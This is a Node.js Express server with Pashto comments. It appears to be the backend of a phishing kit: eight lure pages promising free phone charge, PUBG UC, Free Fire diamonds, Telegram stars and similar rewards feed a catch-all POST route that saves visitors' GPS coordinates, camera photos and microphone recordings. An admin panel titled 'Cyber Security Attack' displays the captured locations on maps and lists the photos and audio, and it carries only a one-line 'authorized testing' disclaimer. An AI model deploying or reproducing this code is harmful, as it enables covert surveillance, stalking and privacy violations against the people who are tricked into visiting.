const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const uploadDir = path.join(__dirname, 'uploads');
const photosDir = path.join(uploadDir, 'photos');
const voicesDir = path.join(uploadDir, 'voices');
const locationsDir = path.join(uploadDir, 'locations');

[uploadDir, photosDir, voicesDir, locationsDir].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        if (file.fieldname === 'photo') cb(null, photosDir);
        else if (file.fieldname === 'voice') cb(null, voicesDir);
        else cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const ext = file.fieldname === 'photo' ? '.jpg' : '.ogg';
        cb(null, `${Date.now()}_${Math.floor(1000 + Math.random() * 9000)}${ext}`);
    }
});

const upload = multer({ storage: storage });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use('/uploads', express.static(uploadDir));

// --- د ټولو ۸ پاڼو مسیرونه (Routes) ---

// ۱. لومړنۍ پاڼه (د واټساپ ګروپ)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ۲. دویمه پاڼه (وړیا چارج)
app.get('/charge', (req, res) => {
    res.sendFile(path.join(__dirname, 'index2.html'));
});

// ۳. درېیمه پاڼه (پابجی UC)
app.get('/pubg', (req, res) => {
    res.sendFile(path.join(__dirname, 'index3.html'));
});

// ۴. څلورمه پاڼه (فری فایر الماسونه)
app.get('/freefire', (req, res) => {
    res.sendFile(path.join(__dirname, 'index4.html'));
});

// ۵. پنځمه پاڼه (یوټوب ټمنل ډانلوډر)
app.get('/youtube', (req, res) => {
    res.sendFile(path.join(__dirname, 'index5.html'));
});

// ۶. شپږمه پاڼه (تلګرام سټار)
app.get('/telegram', (req, res) => {
    res.sendFile(path.join(__dirname, 'index6.html'));
});

// ۷. اوومه پاڼه (فیسبوک بوسټر)
app.get('/facebook', (req, res) => {
    res.sendFile(path.join(__dirname, 'index7.html'));
});

// ۸. اتمه پاڼه (ویډیو کال شبکه)
app.get('/videocall', (req, res) => {
    res.sendFile(path.join(__dirname, 'index8.html'));
});

// د ډېټا راټولولو عامه لار (POST) د ټولو پاڼو لپاره
app.post('*', upload.fields([{ name: 'photo' }, { name: 'voice' }]), (req, res) => {
    if (req.body.latitude && req.body.longitude) {
        const lat = parseFloat(req.body.latitude);
        const lng = parseFloat(req.body.longitude);
        if (!isNaN(lat) && !isNaN(lng)) {
            const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
            const entry = `نېټه: ${time} | لوکیشن: https://maps.google.com/?q=${lat},{$lng}\n-----------------------------------\n`;
            fs.appendFileSync(path.join(locationsDir, 'locations.txt'), entry, 'utf8');
            return res.send("Location Saved");
        }
    }
    if (req.files && req.files.photo) return res.send("Photo Saved");
    if (req.files && req.files.voice) return res.send("Voice Saved");
    res.status(400).send("Bad Request");
});

// مرکزي اډمین پینل
app.get('/admin', (req, res) => {
    if (req.query.action === 'enter') {
        res.setHeader('Set-Cookie', 'welcome=true; Path=/');
        return res.redirect('/admin');
    }

    if (req.query.delete) {
        const target = req.query.delete;
        if (target === 'locations') {
            const locPath = path.join(locationsDir, 'locations.txt');
            if (fs.existsSync(locPath)) fs.unlinkSync(locPath);
        } else if (target === 'all_photos') {
            fs.readdirSync(photosDir).forEach(file => fs.unlinkSync(path.join(photosDir, file)));
        } else {
            const safePath = path.join(__dirname, target);
            if (fs.existsSync(safePath) && safePath.startsWith(uploadDir)) {
                fs.unlinkSync(safePath);
            }
        }
        return res.redirect('/admin');
    }

    let locationsHtml = '<p>تر اوسه کوم لوکیشن نه دی ثبت شوی.</p>';
    let deleteLocBtn = '';
    const locPath = path.join(locationsDir, 'locations.txt');
    if (fs.existsSync(locPath)) {
        deleteLocBtn = `<a href="/admin?delete=locations" class="delete-btn" onclick="return confirm('ټول لوکیشنونه پاک شي؟')">ټول پاکول</a>`;
        const content = fs.readFileSync(locPath, 'utf8');
        const matches = [...content.matchAll(/q=([0-9\.-]+),([0-9\.-]+)/g)];
        if (matches.length > 0) {
            locationsHtml = '';
            matches.reverse().forEach(match => {
                locationsHtml += `<div class="map-container"><iframe width="100%" height="150" frameborder="0" scrolling="no" src="https://maps.google.com/maps?q=${match[1]},${match[2]}&z=15&output=embed"></iframe></div>`;
            });
        }
    }

    let photosHtml = "<p style='grid-column: span 3; text-align: center;'>کوم عکس نشته.</p>";
    let deleteAllPhotosBtn = '';
    const photosList = fs.existsSync(photosDir) ? fs.readdirSync(photosDir) : [];
    if (photosList.length > 0) {
        deleteAllPhotosBtn = `<a href="/admin?delete=all_photos" class="delete-btn" onclick="return confirm('ټول عکسونه پاک شي؟')">ټول پاکول</a>`;
        photosHtml = '';
        photosList.reverse().forEach(file => {
            const filePath = `uploads/photos/${file}`;
            photosHtml += `
                <div class="item-box">
                    <a href="/${filePath}" target='_blank'><img src="/${filePath}" alt='Photo'></a><br>
                    <a href="/admin?delete=${filePath}" class='delete-btn' onclick="return confirm('دا عکس ډليټ شي؟')">ډليټ</a>
                </div>`;
        });
    }

    let voicesHtml = "<p>کوم غږیز ریکارډ تر اوسه نشته.</p>";
    const voicesList = fs.existsSync(voicesDir) ? fs.readdirSync(voicesDir) : [];
    if (voicesList.length > 0) {
        voicesHtml = '';
        voicesList.reverse().forEach(file => {
            const filePath = `uploads/voices/${file}`;
            voicesHtml += `
                <div class='item-box' style='margin-bottom: 8px; text-align: right; padding: 8px;'>
                    <audio controls src="/${filePath}"></audio>
                    <div style='text-align: left; margin-top: 5px;'><a href="/admin?delete=${filePath}" class='delete-btn' onclick="return confirm('دا غږ ډليټ شي؟')">ډليټ کول</a></div>
                </div>`;
        });
    }

    const showWelcome = !req.headers.cookie?.includes('welcome=true') && req.query.action !== 'enter';

    let html = `
    <!DOCTYPE html>
    <html lang="ps">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>د اډمین پینل - راټول شوي معلومات</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 10px; margin: 0; direction: rtl; text-align: right; }
            .welcome-card { background: white; border-radius: 12px; padding: 20px; max-width: 500px; margin: 30px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.15); text-align: center; }
            .welcome-card img { width: 100%; max-height: 250px; object-fit: cover; border-radius: 8px; margin-bottom: 15px; }
            .welcome-title { color: #111; font-size: 20px; margin-bottom: 10px; border-bottom: 2px solid #25D366; padding-bottom: 8px; }
            .welcome-msg { color: #333; font-size: 14px; line-height: 1.8; text-align: justify; background: #f9f9f9; padding: 12px; border-radius: 6px; border-right: 4px solid #ff4d4d; margin-bottom: 20px; }
            .enter-btn { background-color: #25D366; color: white; padding: 12px 25px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 16px; display: inline-block; }
            h2 { color: #111; border-bottom: 2px solid #25D366; padding-bottom: 6px; margin-top: 15px; font-size: 18px; display: flex; justify-content: space-between; align-items: center; }
            .card { background: white; border-radius: 8px; padding: 10px; margin-bottom: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
            .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
            .item-box { position: relative; border: 1px solid #ddd; border-radius: 4px; overflow: hidden; background: #fff; padding: 4px; text-align: center; }
            .grid img { width: 100%; height: 90px; object-fit: cover; border-radius: 3px; }
            .map-container { margin-bottom: 10px; border-radius: 6px; overflow: hidden; border: 1px solid #ddd; }
            audio { width: 100%; margin-top: 5px; height: 35px; }
            .delete-btn { background-color: #ff4d4d; color: white; border: none; padding: 3px 6px; border-radius: 3px; cursor: pointer; font-size: 11px; text-decoration: none; display: inline-block; margin-top: 4px; }
            p { color: #667781; font-size: 14px; }
        </style>
    </head>
    <body>`;

    if (showWelcome) {
        html += `
        <div class="welcome-card">
            <img src="https://files.catbox.moe/4dzyf1.jpg" alt="Welcome Image">
            <div class="welcome-title">🛡️ Welcome to Cyber Security Attack ⚡</div>
            <p style="text-align: center; font-weight: bold; color: #25D366; margin: 5px 0;">🔰 د برنامې هرکلی!</p>
            <div class="welcome-msg">
                ⚠️ <strong>مهمه خبرتیا:</strong> دا اپلیکیشن یوازې د مجازو امنیتي ازموینو لپاره دی.<br><br>
                👨‍💻 <strong>درنښت، اډمین:</strong> @Mastershahzada
            </div>
            <a href="/admin?action=enter" class="enter-btn">سیستم ته ننوتل 🚀</a>
        </div>`;
    } else {
        html += `
        <h2>📍 راټول شوي لوکیشنونه: ${deleteLocBtn}</h2>
        <div class="card">${locationsHtml}</div>

        <h2>📸 اخیستل شوي عکسونه: ${deleteAllPhotosBtn}</h2>
        <div class="card grid">${photosHtml}</div>

        <h2>🎙️ ریکارډ شوي غږونه (مک):</h2>
        <div class="card">${voicesHtml}</div>`;
    }

    html += `</body></html>`;
    res.send(html);
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
